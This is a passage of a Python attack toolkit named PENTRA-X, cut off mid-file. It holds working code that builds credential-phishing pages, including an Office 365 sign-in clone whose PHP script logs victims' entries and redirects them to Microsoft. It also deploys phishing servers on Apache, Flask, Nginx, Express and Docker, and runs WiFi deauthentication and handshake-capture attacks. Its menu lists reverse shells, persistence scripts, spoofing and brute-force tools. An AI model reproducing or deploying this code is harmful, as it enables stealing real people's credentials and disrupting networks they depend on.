    folder = "phish_corporate"
    os.makedirs(folder, exist_ok=True)
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Office 365 - Sign in</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f3f2f1; margin: 0; padding: 20px; }
            .container { max-width: 440px; margin: 100px auto; background: white; padding: 44px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { color: #0078d4; margin: 0; font-size: 24px; }
            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
            button { width: 100%; background: #0078d4; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
            button:hover { background: #106ebe; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <h1>Sign in</h1>
            </div>
            <form action="capture.php" method="post">
                <input type="email" name="email" placeholder="Email, phone, or Skype" required>
                <button type="submit">Next</button>
            </form>
        </div>
    </body>
    </html>
    """
    
    with open(f"{folder}/index.html", "w") as f:
        f.write(html)
    
    # Create capture script
    php_capture = """
    <?php
    if ($_POST) {
        $data = "Email: " . $_POST['email'] . "\\n";
        $data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
        $data .= "---\\n";
        file_put_contents('captured.txt', $data, FILE_APPEND);
    }
    header('Location: https://login.microsoftonline.com');
    ?>
    """
    
    with open(f"{folder}/capture.php", "w") as f:
        f.write(php_capture)
    
    print(f"[+] Corporate template created in {folder}/")

def custom_template_builder():
    print("[+] Custom Template Builder")
    print("[!] This will help you create a custom phishing template.")
    
    template_name = input("Template name: ").strip()
    if not template_name:
        template_name = "custom_template"
    
    folder = f"phish_{template_name}"
    os.makedirs(folder, exist_ok=True)
    
    print("[!] Choose template type:")
    print("1. Login form")
    print("2. Registration form")
    print("3. Password reset")
    print("4. File upload")
    print("5. Custom HTML")
    
    template_type = input("Select template type (1-5): ").strip() or "1"
    
    if template_type == "5":
        print("[+] Enter your custom HTML (press Enter twice to finish):")
        custom_html = ""
        while True:
            line = input()
            if line == "" and custom_html.endswith("\n"):
                break
            custom_html += line + "\n"
        
        with open(f"{folder}/index.html", "w") as f:
            f.write(custom_html)
    else:
        # Generate basic template based on type
        if template_type == "1":
            title = "Login"
            fields = [("username", "Username"), ("password", "Password")]
        elif template_type == "2":
            title = "Register"
            fields = [("username", "Username"), ("email", "Email"), ("password", "Password"), ("confirm_password", "Confirm Password")]
        elif template_type == "3":
            title = "Password Reset"
            fields = [("email", "Email Address")]
        elif template_type == "4":
            title = "File Upload"
            fields = [("file", "Select File")]
        else:
            title = "Login"
            fields = [("username", "Username"), ("password", "Password")]
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>{title}</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }}
                .container {{ max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                h1 {{ text-align: center; color: #333; margin-bottom: 30px; }}
                input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
                button {{ width: 100%; background: #007bff; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }}
                button:hover {{ background: #0056b3; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>{title}</h1>
                <form action="capture.php" method="post">
        """
        
        for field_name, field_label in fields:
            if field_name == "password" or field_name == "confirm_password":
                html += f'                    <input type="password" name="{field_name}" placeholder="{field_label}" required>\n'
            elif field_name == "email":
                html += f'                    <input type="email" name="{field_name}" placeholder="{field_label}" required>\n'
            elif field_name == "file":
                html += f'                    <input type="file" name="{field_name}" required>\n'
            else:
                html += f'                    <input type="text" name="{field_name}" placeholder="{field_label}" required>\n'
        
        html += """
                    <button type="submit">Submit</button>
                </form>
            </div>
        </body>
        </html>
        """
        
        with open(f"{folder}/index.html", "w") as f:
            f.write(html)
    
    # Create capture script
    php_capture = """
    <?php
    if ($_POST) {
        $data = "Time: " . date('Y-m-d H:i:s') . "\\n";
        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
        $data .= "Data: " . json_encode($_POST) . "\\n";
        $data .= "---\\n";
        file_put_contents('captured.txt', $data, FILE_APPEND);
    }
    header('Location: https://www.google.com');
    ?>
    """
    
    with open(f"{folder}/capture.php", "w") as f:
        f.write(php_capture)
    
    print(f"[+] Custom template created in {folder}/")

# Server setup functions
def setup_apache_php_server():
    print("[+] Setting up Apache + PHP server...")
    
    # Install Apache and PHP
    subprocess.run(["sudo", "apt", "update"])
    subprocess.run(["sudo", "apt", "install", "-y", "apache2", "php", "php-mysql"])
    
    # Create phishing directory
    phish_dir = "/var/www/html/phish"
    subprocess.run(["sudo", "mkdir", "-p", phish_dir])
    subprocess.run(["sudo", "chown", "-R", "$USER:$USER", phish_dir])
    
    print(f"[+] Apache server configured at {phish_dir}")
    print("[+] Upload phishing files to this directory")
    print("[+] Access via: http://your-ip/phish/")

def setup_flask_server():
    print("[+] Setting up Python Flask server...")
    
    # Create Flask app
    flask_app = """
from flask import Flask, request, render_template_string, redirect
import json
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head><title>Phishing Page</title></head>
    <body>
        <h1>Phishing Page</h1>
        <p>This is a Flask-based phishing server.</p>
    </body>
    </html>
    ''')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.form
    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'data': dict(data)
    }
    
    with open('captured.json', 'a') as f:
        f.write(json.dumps(log_entry) + '\\n')
    
    return redirect('https://www.google.com')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
    """
    
    with open("phish_server.py", "w") as f:
        f.write(flask_app)
    
    print("[+] Flask server created: phish_server.py")
    print("[+] Run with: python3 phish_server.py")
    print("[+] Access via: http://your-ip:8080/")

def setup_nginx_php_server():
    print("[+] Setting up Nginx + PHP server...")
    
    # Install Nginx and PHP
    subprocess.run(["sudo", "apt", "update"])
    subprocess.run(["sudo", "apt", "install", "-y", "nginx", "php-fpm", "php-mysql"])
    
    # Create phishing directory
    phish_dir = "/var/www/html/phish"
    subprocess.run(["sudo", "mkdir", "-p", phish_dir])
    subprocess.run(["sudo", "chown", "-R", "$USER:$USER", phish_dir])
    
    # Create Nginx configuration
    nginx_conf = """
server {
    listen 80;
    server_name _;
    root /var/www/html/phish;
    index index.html index.php;
    
    location / {
        try_files $uri $uri/ =404;
    }
    
    location ~ \\.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    }
}
"""
    
    with open("phish_nginx.conf", "w") as f:
        f.write(nginx_conf)
    
    print(f"[+] Nginx server configured at {phish_dir}")
    print("[+] Upload phishing files to this directory")
    print("[+] Access via: http://your-ip/phish/")
    print("[+] Nginx config saved as: phish_nginx.conf")

def setup_express_server():
    print("[+] Setting up Node.js Express server...")
    
    # Create package.json
    package_json = """
{
  "name": "phish-server",
  "version": "1.0.0",
  "description": "Phishing server",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "dependencies": {
    "express": "^4.17.1",
    "body-parser": "^1.19.0"
  }
}
"""
    
    with open("package.json", "w") as f:
        f.write(package_json)
    
    # Create Express server
    express_app = """
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Serve phishing page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Capture form data
app.post('/capture', (req, res) => {
    const data = {
        timestamp: new Date().toISOString(),
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        formData: req.body
    };
    
    fs.appendFileSync('captured.json', JSON.stringify(data) + '\\n');
    
    // Redirect to legitimate site
    res.redirect('https://www.google.com');
});

app.listen(PORT, () => {
    console.log(`Phishing server running on port ${PORT}`);
});
"""
    
    with open("server.js", "w") as f:
        f.write(express_app)
    
    # Create public directory and sample page
    os.makedirs("public", exist_ok=True)
    
    sample_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; margin-bottom: 30px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; background: #007bff; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <form action="/capture" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
"""
    
    with open("public/index.html", "w") as f:
        f.write(sample_html)
    
    print("[+] Express server created:")
    print("[+] - package.json (dependencies)")
    print("[+] - server.js (main server)")
    print("[+] - public/index.html (sample page)")
    print("[+] Run with: npm install && npm start")
    print("[+] Access via: http://your-ip:3000/")

def setup_docker_server():
    print("[+] Setting up Docker container...")
    
    # Create Dockerfile
    dockerfile = """
FROM nginx:alpine

# Install PHP
RUN apk add --no-cache php-fpm php-mysqli

# Copy nginx configuration
COPY nginx.conf /etc/nginx/conf.d/default.conf

# Create web directory
RUN mkdir -p /var/www/html/phish

# Copy phishing files
COPY phish/ /var/www/html/phish/

# Expose port
EXPOSE 80

# Start nginx and php-fpm
CMD ["sh", "-c", "php-fpm -D && nginx -g 'daemon off;'"]
"""
    
    with open("Dockerfile", "w") as f:
        f.write(dockerfile)
    
    # Create nginx configuration for Docker
    nginx_docker_conf = """
server {
    listen 80;
    server_name _;
    root /var/www/html/phish;
    index index.html index.php;
    
    location / {
        try_files $uri $uri/ =404;
    }
    
    location ~ \\.php$ {
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_index index.php;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
}
"""
    
    with open("nginx.conf", "w") as f:
        f.write(nginx_docker_conf)
    
    # Create docker-compose.yml
    docker_compose = """
version: '3'
services:
  phish-server:
    build: .
    ports:
      - "8080:80"
    volumes:
      - ./phish:/var/www/html/phish
"""
    
    with open("docker-compose.yml", "w") as f:
        f.write(docker_compose)
    
    # Create phish directory
    os.makedirs("phish", exist_ok=True)
    
    print("[+] Docker setup created:")
    print("[+] - Dockerfile")
    print("[+] - nginx.conf")
    print("[+] - docker-compose.yml")
    print("[+] - phish/ directory")
    print("[+] Build and run with: docker-compose up --build")
    print("[+] Access via: http://your-ip:8080/")

def wifi_scan_advanced_wrapper():
    print("[+] Advanced WiFi Network Scanner - Professional wireless reconnaissance")
    print("[!] This requires monitor mode and root privileges.")
    
    if not check_root():
        print("[-] Root privileges required.")
        return
    
    # Check if aircrack-ng tools are available
    if shutil.which("airodump-ng") is None:
        print("[-] aircrack-ng suite not found. Installing...")
        ensure_installed("airodump-ng", "aircrack-ng")
        if shutil.which("airodump-ng") is None:
            print("[-] Could not install aircrack-ng. Please install manually.")
            return
    
    # Get available wireless interfaces
    print("[+] Detecting wireless interfaces...")
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        interfaces = []
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line and 'no wireless extensions' not in line:
                iface = line.split()[0]
                interfaces.append(iface)
        
        if not interfaces:
            print("[-] No wireless interfaces found.")
            return
        
        print(f"[+] Found wireless interfaces: {', '.join(interfaces)}")
    except Exception as e:
        print(f"[-] Could not detect interfaces: {e}")
        interfaces = ["wlan0", "wlan1", "wlan2"]
    
    iface = input(f"Wireless interface ({', '.join(interfaces)}): ").strip()
    if not iface:
        iface = interfaces[0] if interfaces else "wlan0"
    
    print("[!] Choose scan type:")
    print("1. Quick scan (basic network list)")
    print("2. Detailed scan (with clients and signal strength)")
    print("3. Continuous monitoring (save to file)")
    print("4. Channel-specific scan")
    print("5. WPS-enabled networks scan")
    print("6. Hidden networks detection")
    
    choice = input("Select scan type (1-6, default 1): ").strip() or "1"
    
    if choice == "1":
        print("[+] Quick WiFi scan")
        try:
            # Use iwlist for basic scan
            result = subprocess.run(["sudo", "iwlist", iface, "scan"], capture_output=True, text=True)
            if result.returncode == 0:
                print("[+] Quick scan results:")
                networks = []
                current_network = {}
                
                for line in result.stdout.split('\n'):
                    if 'ESSID:' in line:
                        essid = line.split('"')[1] if '"' in line else "Hidden"
                        current_network['ESSID'] = essid
                    elif 'Address:' in line:
                        bssid = line.split()[-1]
                        current_network['BSSID'] = bssid
                    elif 'Channel:' in line:
                        channel = line.split()[-1]
                        current_network['Channel'] = channel
                    elif 'Encryption key:' in line:
                        encryption = "WEP" if "on" in line else "Open"
                        current_network['Encryption'] = encryption
                    elif 'Quality=' in line and current_network:
                        quality = line.split('=')[1].split()[0]
                        current_network['Quality'] = quality
                        networks.append(current_network.copy())
                        current_network = {}
                
                if networks:
                    print(f"\n[+] Found {len(networks)} networks:")
                    print(f"{'ESSID':<20} {'BSSID':<18} {'Channel':<8} {'Encryption':<10} {'Quality':<8}")
                    print("-" * 70)
                    for net in networks:
                        essid = net.get('ESSID', 'Hidden')[:18]
                        bssid = net.get('BSSID', 'Unknown')
                        channel = net.get('Channel', 'Unknown')
                        encryption = net.get('Encryption', 'Unknown')
                        quality = net.get('Quality', 'Unknown')
                        print(f"{essid:<20} {bssid:<18} {channel:<8} {encryption:<10} {quality:<8}")
                else:
                    print("[-] No networks found.")
            else:
                print("[-] Quick scan failed.")
        except Exception as e:
            print(f"[-] Quick scan failed: {e}")
    
    elif choice == "2":
        print("[+] Detailed WiFi scan with airodump-ng")
        try:
            # Start monitor mode
            subprocess.run(["sudo", "airmon-ng", "start", iface])
            mon_iface = iface + "mon"
            
            # Check if monitor interface exists
            if not os.path.exists(f"/sys/class/net/{mon_iface}"):
                # Try alternative naming
                for alt_name in [f"{iface}_mon", f"{iface}mon"]:
                    if os.path.exists(f"/sys/class/net/{alt_name}"):
                        mon_iface = alt_name
                        break
            
            print(f"[+] Monitor interface: {mon_iface}")
            print("[!] Starting detailed scan...")
            print("[!] Press Ctrl+C to stop scan")
            
            # Run airodump-ng with output to file
            output_file = f"wifi_scan_{int(time.time())}.csv"
            cmd = ["sudo", "airodump-ng", "-w", output_file.replace('.csv', ''), "--output-format", "csv", mon_iface]
            
            proc = subprocess.Popen(cmd)
            try:
                proc.wait()
            except KeyboardInterrupt:
                print("\n[!] Scan interrupted by user.")
                proc.terminate()
            
            # Stop monitor mode
            subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
            
            # Parse results
            if os.path.exists(output_file):
                print(f"\n[+] Scan results saved to {output_file}")
                try:
                    with open(output_file, 'r') as f:
                        content = f.read()
                        lines = content.split('\n')
                        networks = []
                        
                        for line in lines:
                            if line.strip() and ',' in line and 'BSSID' not in line:
                                parts = line.split(',')
                                if len(parts) >= 14:
                                    bssid = parts[0].strip()
                                    if bssid and bssid != "00:00:00:00:00:00":
                                        network = {
                                            'BSSID': bssid,
                                            'First_time': parts[1].strip(),
                                            'Last_time': parts[2].strip(),
                                            'Channel': parts[3].strip(),
                                            'Speed': parts[4].strip(),
                                            'Privacy': parts[5].strip(),
                                            'Cipher': parts[6].strip(),
                                            'Authentication': parts[7].strip(),
                                            'Power': parts[8].strip(),
                                            'Beacons': parts[9].strip(),
                                            'IV': parts[10].strip(),
                                            'LAN_IP': parts[11].strip(),
                                            'ID_length': parts[12].strip(),
                                            'ESSID': parts[13].strip()
                                        }
                                        networks.append(network)
                        
                        if networks:
                            print(f"\n[+] Found {len(networks)} networks:")
                            print(f"{'ESSID':<20} {'BSSID':<18} {'Channel':<8} {'Privacy':<8} {'Power':<6}")
                            print("-" * 65)
                            for net in networks[:20]:  # Show first 20
                                essid = net['ESSID'][:18] if net['ESSID'] else "Hidden"
                                bssid = net['BSSID']
                                channel = net['Channel']
                                privacy = net['Privacy']
                                power = net['Power']
                                print(f"{essid:<20} {bssid:<18} {channel:<8} {privacy:<8} {power:<6}")
                            
                            if len(networks) > 20:
                                print(f"... and {len(networks) - 20} more networks")
                        else:
                            print("[-] No networks found.")
                except Exception as e:
                    print(f"[-] Could not parse results: {e}")
        except Exception as e:
            print(f"[-] Detailed scan failed: {e}")
    
    elif choice == "3":
        print("[+] Continuous WiFi monitoring")
        duration = input("Duration in seconds (default 60): ").strip() or "60"
        output_file = f"wifi_monitor_{int(time.time())}.csv"
        
        try:
            subprocess.run(["sudo", "airmon-ng", "start", iface])
            mon_iface = iface + "mon"
            
            print(f"[+] Monitoring for {duration} seconds...")
            print(f"[+] Output file: {output_file}")
            
            cmd = ["timeout", duration, "sudo", "airodump-ng", "-w", output_file.replace('.csv', ''), "--output-format", "csv", mon_iface]
            subprocess.run(cmd)
            subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
            
            print(f"[+] Monitoring completed. Results saved to {output_file}")
        except Exception as e:
            print(f"[-] Monitoring failed: {e}")
    
    elif choice == "4":
        print("[+] Channel-specific scan")
        channel = input("Channel number (1-14): ").strip()
        if not channel or not channel.isdigit() or int(channel) < 1 or int(channel) > 14:
            print("[-] Invalid channel. Using channel 6.")
            channel = "6"
        
        try:
            subprocess.run(["sudo", "airmon-ng", "start", iface])
            mon_iface = iface + "mon"
            
            print(f"[+] Scanning channel {channel}...")
            cmd = ["sudo", "airodump-ng", "-c", channel, mon_iface]
            subprocess.run(cmd)
            subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
        except Exception as e:
            print(f"[-] Channel scan failed: {e}")
    
    elif choice == "5":
        print("[+] WPS-enabled networks scan")
        try:
            subprocess.run(["sudo", "airmon-ng", "start", iface])
            mon_iface = iface + "mon"
            
            print("[+] Scanning for WPS-enabled networks...")
            cmd = ["sudo", "wash", "-i", mon_iface]
            subprocess.run(cmd)
            subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
        except Exception as e:
            print(f"[-] WPS scan failed: {e}")
            print("[!] Wash tool not available. Install reaver-wps package.")
    
    elif choice == "6":
        print("[+] Hidden networks detection")
        try:
            subprocess.run(["sudo", "airmon-ng", "start", iface])
            mon_iface = iface + "mon"
            
            print("[+] Scanning for hidden networks...")
            print("[!] This may take longer as we wait for probe responses...")
            
            cmd = ["sudo", "airodump-ng", "--hidden", mon_iface]
            subprocess.run(cmd)
            subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
        except Exception as e:
            print(f"[-] Hidden network scan failed: {e}")
    
    input("\n[Press Enter to return to the menu]")

def wifi_handshake_advanced_wrapper():
    print("[+] Advanced WPA Handshake Capture - Professional wireless attack")
    print("[!] This requires monitor mode and root privileges.")
    
    if not check_root():
        print("[-] Root privileges required.")
        return
    
    iface = input("Wireless interface (e.g. wlan0): ").strip()
    if not iface:
        print("[-] Interface required.")
        return
    
    bssid = input("Target BSSID (AP MAC): ").strip()
    if not bssid:
        print("[-] BSSID required.")
        return
    
    channel = input("Channel: ").strip()
    if not channel:
        print("[-] Channel required.")
        return
    
    print("[!] Choose capture method:")
    print("1. Passive capture (wait for handshake)")
    print("2. Active capture (deauth attack)")
    print("3. Continuous deauth")
    
    choice = input("Select method (1-3, default 1): ").strip() or "1"
    
    if choice == "1":
        wifi_handshake_capture()
    elif choice == "2":
        print("[+] Active capture with deauth")
        wifi_handshake_capture()
    elif choice == "3":
        print("[+] Continuous deauth attack")
        client = input("Target client MAC (optional): ").strip()
        duration = input("Duration in seconds (default 30): ").strip() or "30"
        
        try:
            subprocess.run(["sudo", "airmon-ng", "start", iface])
            mon_iface = iface + "mon"
            
            if client:
                cmd = ["timeout", duration, "sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-c", client, mon_iface]
            else:
                cmd = ["timeout", duration, "sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_iface]
            
            subprocess.run(cmd)
            subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
        except Exception as e:
            print(f"[-] Deauth failed: {e}")
    
    input("\n[Press Enter to return to the menu]")

def network_enumeration():
    """Comprehensive network enumeration tool"""
    print(f"{Colors.OKCYAN}[+] Network Enumeration Tool{Colors.ENDC}")
    print("This tool performs comprehensive network enumeration including:")
    print("- Live host discovery")
    print("- Service enumeration") 
    print("- OS fingerprinting")
    print("- Network topology mapping")
    print("- Vulnerability assessment")
    
    target = input("Target network (e.g. 192.168.1.0/24): ").strip()
    if not target:
        print("[-] Target required.")
        return
    
    print(f"\n{Colors.OKBLUE}[*] Starting comprehensive network enumeration...{Colors.ENDC}")
    
    # 1. Live host discovery
    print(f"\n{Colors.OKGREEN}[+] Phase 1: Live Host Discovery{Colors.ENDC}")
    try:
        # Ping sweep
        print("[*] Performing ping sweep...")
        ping_cmd = ["nmap", "-sn", target]
        subprocess.run(ping_cmd)
        
        # ARP scan
        print("[*] Performing ARP scan...")
        arp_cmd = ["nmap", "-sn", "--send-ip", target]
        subprocess.run(arp_cmd)
        
    except Exception as e:
        print(f"[-] Host discovery failed: {e}")
    
    # 2. Port scanning and service enumeration
    print(f"\n{Colors.OKGREEN}[+] Phase 2: Port Scanning & Service Enumeration{Colors.ENDC}")
    try:
        # TCP SYN scan
        print("[*] Performing TCP SYN scan...")
        syn_cmd = ["nmap", "-sS", "-sV", "-O", "--version-intensity", "5", target]
        subprocess.run(syn_cmd)
        
        # UDP scan for common ports
        print("[*] Performing UDP scan...")
        udp_cmd = ["nmap", "-sU", "--top-ports", "100", target]
        subprocess.run(udp_cmd)
        
    except Exception as e:
        print(f"[-] Port scanning failed: {e}")
    
    # 3. Advanced enumeration
    print(f"\n{Colors.OKGREEN}[+] Phase 3: Advanced Enumeration{Colors.ENDC}")
    try:
        # Script scan
        print("[*] Running NSE scripts...")
        script_cmd = ["nmap", "--script", "vuln,discovery,auth", target]
        subprocess.run(script_cmd)
        
        # Service enumeration
        print("[*] Enumerating services...")
        service_cmd = ["nmap", "-sV", "--version-all", "--script", "banner", target]
        subprocess.run(service_cmd)
        
    except Exception as e:
        print(f"[-] Advanced enumeration failed: {e}")
    
    # 4. Network topology
    print(f"\n{Colors.OKGREEN}[+] Phase 4: Network Topology{Colors.ENDC}")
    try:
        # Traceroute
        print("[*] Mapping network topology...")
        trace_cmd = ["nmap", "--traceroute", target]
        subprocess.run(trace_cmd)
        
    except Exception as e:
        print(f"[-] Topology mapping failed: {e}")
    
    # 5. Vulnerability assessment
    print(f"\n{Colors.OKGREEN}[+] Phase 5: Vulnerability Assessment{Colors.ENDC}")
    try:
        # Vulnerability scan
        print("[*] Running vulnerability scan...")
        vuln_cmd = ["nmap", "--script", "vuln", target]
        subprocess.run(vuln_cmd)
        
    except Exception as e:
        print(f"[-] Vulnerability scan failed: {e}")
    
    print(f"\n{Colors.OKGREEN}[+] Network enumeration completed!{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Check the output above for discovered hosts and services.{Colors.ENDC}")
    
    # Save results
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    results_file = f"network_enum_{timestamp}.txt"
    
    try:
        with open(results_file, "w") as f:
            f.write(f"Network Enumeration Results - {target}\n")
            f.write(f"Timestamp: {datetime.now()}\n")
            f.write("=" * 50 + "\n")
            f.write("Use the output above to analyze discovered hosts and services.\n")
        print(f"{Colors.OKGREEN}[+] Results saved to: {results_file}{Colors.ENDC}")
    except Exception as e:
        print(f"[-] Failed to save results: {e}")
    
    log_result("network_enum", f"Target: {target} | Results: {results_file}")
    input("\n[Press Enter to return to the menu]")

# Categorized menu system
categorized_menus = {
    "Network Reconnaissance": [
        ("1. ARP Scan", arp_scan_wrapper),
        ("2. Port Scan", port_scan_wrapper),
        ("3. Nmap Advanced Scan", nmap_advanced_wrapper),
        ("4. Network Enumeration", network_enumeration),
    ],
    
    "Web Testing & Exploitation": [
        ("1. Gobuster Directory Scan", gobuster_wrapper),
        ("2. SQLMap Injection Scan", sqlmap_advanced_wrapper),
        ("3. Advanced XSS Testing", advanced_xss_test),
        ("4. Advanced LFI/RFI Testing", advanced_lfi_rfi_test),
        ("5. Advanced CSRF Testing", advanced_csrf_test),
        ("6. Advanced Web Vulnerability Scanner", advanced_web_vuln_scan),
        ("7. Advanced SSRF Testing", advanced_ssrf_test),
        ("8. Directory Bruteforce", dir_brute_wrapper),
    ],
    
    "Wireless Attacks": [
        ("1. WiFi Network Scan", wifi_scan_advanced_wrapper),
        ("2. Capture WPA Handshake", wifi_handshake_advanced_wrapper),
        ("3. Crack WPA Handshake", wifi_crack_handshake),
        ("4. Automated WiFi Attack (Wifite)", wifi_wifite),
        ("5. WiFi MITM Attacks", wifi_mitm_menu),
    ],
    
    "Social Engineering": [
        ("1. BlackEye Phishing Framework", blackeye_phishing),
        ("2. SocialFish Phishing Framework", socialfish_phishing),
        ("3. HiddenEye Phishing Framework", hiddeneye_phishing),
        ("4. Advanced Site Cloner", advanced_site_cloner),
        ("5. Social Engineering Toolkit (SET)", setoolkit_advanced_wrapper),
        ("6. Fake Email Spoof", email_spoof_advanced_wrapper),
        ("7. Phishing Page Generator", phishing_advanced_wrapper),
    ],
    
    "Password Attacks": [
        ("1. Hydra Login Bruteforce", hydra_advanced_wrapper),
        ("2. Crack SHA256 Hash", crack_hash_wrapper),
        ("3. Advanced SMB/NTLM/LDAP Brute-force", advanced_smb_bruteforce),
        ("4. Advanced Hashdump & Offline Password Cracking", advanced_hashdump_crack),
    ],
    
    "MITM & Network Attacks": [
        ("1. Advanced MITM Attacks", mitm_menu),
        ("2. ARP Spoofing", arp_spoof),
        ("3. DNS Spoofing", dns_spoof),
        ("4. Advanced DHCP Starvation/Poisoning", advanced_dhcp_attack),
        ("5. Advanced SNMP Enumeration", advanced_snmp_enum),
        ("6. Advanced IPv6 Attacks", advanced_ipv6_attacks),
    ],
    
    "Information Gathering": [
        ("1. Whois Lookup", whois_wrapper),
        ("2. DNS Lookup", dns_wrapper),
        ("3. SSL Certificate Info", ssl_wrapper),
        ("4. Subdomain Finder", subdomain_wrapper),
        ("5. HTTP Headers", headers_wrapper),
        ("6. CVE Search", cve_wrapper),
        ("7. OSINT Toolkit", osint_menu),
        ("8. OSINT Wordlist Generator", osint_wordlist_generator),
    ],
    
    "Post Exploitation": [
        ("1. Reverse Shell (TCP)", reverse_shell),
        ("2. Generate Reverse Shell Payload", generate_reverse_shell_payload),
        ("3. Start Listener (Netcat)", start_listener),
        ("4. Generate Persistence Script", generate_persistence_script),
        ("5. Generate msfvenom Payload", generate_msfvenom_payload),
    ]
}

# Main menu categories
main_categories = [
    "Network Reconnaissance",
    "Web Testing & Exploitation", 
    "Wireless Attacks",
    "Social Engineering",
    "Password Attacks",
    "MITM & Network Attacks",
    "Information Gathering",
    "Post Exploitation"
]

def show_category_menu(category):
    """Display menu for a specific category with arrow key navigation and colorization"""
    tools = categorized_menus[category]
    def menu(stdscr):
        curses.curs_set(0)
        curses.start_color()
        curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_CYAN)   # Selected
        curses.init_pair(2, curses.COLOR_YELLOW, curses.COLOR_BLACK) # Header
        curses.init_pair(3, curses.COLOR_RED, curses.COLOR_BLACK)    # Warning/Error
        curses.init_pair(4, curses.COLOR_WHITE, curses.COLOR_BLACK)  # Regular
        current_row = 0
        while True:
            stdscr.clear()
            stdscr.attron(curses.color_pair(2) | curses.A_BOLD)
            stdscr.addstr(0, 0, f"=== {category} ===")
            stdscr.attroff(curses.color_pair(2) | curses.A_BOLD)
            for i, (tool_name, tool_func) in enumerate(tools):
                clean_name = tool_name.split('. ', 1)[1] if '. ' in tool_name else tool_name
                if i == current_row:
                    stdscr.attron(curses.color_pair(1))
                    stdscr.addstr(i+2, 2, f"> {clean_name}")
                    stdscr.attroff(curses.color_pair(1))
                else:
                    stdscr.attron(curses.color_pair(4))
                    stdscr.addstr(i+2, 4, clean_name)
                    stdscr.attroff(curses.color_pair(4))
            stdscr.attron(curses.color_pair(4))
            stdscr.addstr(len(tools)+3, 2, "0. Back to Main Menu")
            stdscr.attroff(curses.color_pair(4))
            stdscr.refresh()
            key = stdscr.getch()
            if key == curses.KEY_UP and current_row > 0:
                current_row -= 1
            elif key == curses.KEY_DOWN and current_row < len(tools)-1:
                current_row += 1
            elif key in [curses.KEY_ENTER, 10, 13]:
                if current_row == -1:
                    break
                tool_name, tool_func = tools[current_row]
                if tool_func:
                    curses.endwin()
                    tool_func()
                    return
                else:
                    stdscr.attron(curses.color_pair(3) | curses.A_BOLD)
                    stdscr.addstr(len(tools)+5, 2, f"[-] {tool_name} - Coming soon!")
                    stdscr.attroff(curses.color_pair(3) | curses.A_BOLD)
                    stdscr.refresh()
                    stdscr.getch()
            elif key == ord('0'):
                break
    curses.wrapper(menu)

def show_main_menu():
    """Display the main categorized menu"""
    print(f"\n{Colors.OKCYAN}=== PENTRA-X MAIN MENU ==={Colors.ENDC}")
    print(f"{Colors.WARNING}Choose a category:{Colors.ENDC}\n")
    
    for i, category in enumerate(main_categories, 1):
